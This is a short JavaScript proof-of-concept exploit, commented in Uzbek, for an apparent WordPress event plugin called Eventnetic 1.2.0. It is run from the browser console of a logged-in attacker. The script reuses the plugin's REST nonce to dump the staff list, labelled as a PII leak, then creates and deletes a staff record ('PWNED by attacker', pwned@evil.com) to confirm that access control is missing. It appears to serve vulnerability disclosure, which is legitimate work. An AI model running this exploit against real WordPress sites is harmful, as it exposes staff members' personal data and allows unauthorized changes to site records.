// Eventnetic 1.2.0 - CVE-2026-XXXXX - PoC
// Brauzer Console'da ishga tushiring (attacker sifatida login)

(async () => {
  console.log('=== Eventnetic 1.2.0 CVE-2026-XXXXX PoC ===');
  console.log('Nonce:', Eventnetic.restNonce);

  // Test A: O'qish
  console.log('\n[TEST A] Staff list...');
  const a = await fetch('/wp-json/eventnetic/v1/staff?limit=100', {
    credentials: 'include',
    headers: { 'X-WP-Nonce': Eventnetic.restNonce }
  });
  console.log('Status:', a.status, '→', a.status === 200 ? 'PII LEAK' : 'OK');

  // Test B: staff_add
  console.log('\n[TEST B] staff_add (TAQIQLANGAN)...');
  const b = await fetch('/wp-json/eventnetic/v1/staff', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-WP-Nonce': Eventnetic.restNonce
    },
    body: JSON.stringify({
      name: 'PWNED by attacker',
      email: 'pwned@evil.com',
      phone: '+10000000000',
      isActive: true
    })
  });
  const bData = await b.json();
  console.log('Status:', b.status, '→', b.status === 200 ? 'VULNERABLE' : 'OK');
  console.log('Response:', bData);

  if (bData?.data?.id) {
    console.log('\n[!!!] ZAIFLIK TASDIQLANDI');
    console.log('Yangi staff ID:', bData.data.id);
  }

  // Test E: staff_delete
  const newId = bData?.data?.id;
  if (newId) {
    console.log('\n[TEST E] staff_delete (TAQIQLANGAN)...');
    const e = await fetch(`/wp-json/eventnetic/v1/staff/${newId}`, {
      method: 'DELETE',
      credentials: 'include',
      headers: { 'X-WP-Nonce': Eventnetic.restNonce }
    });
    console.log('Status:', e.status, '→', e.status === 200 ? 'VULNERABLE' : 'OK');
  }
})();
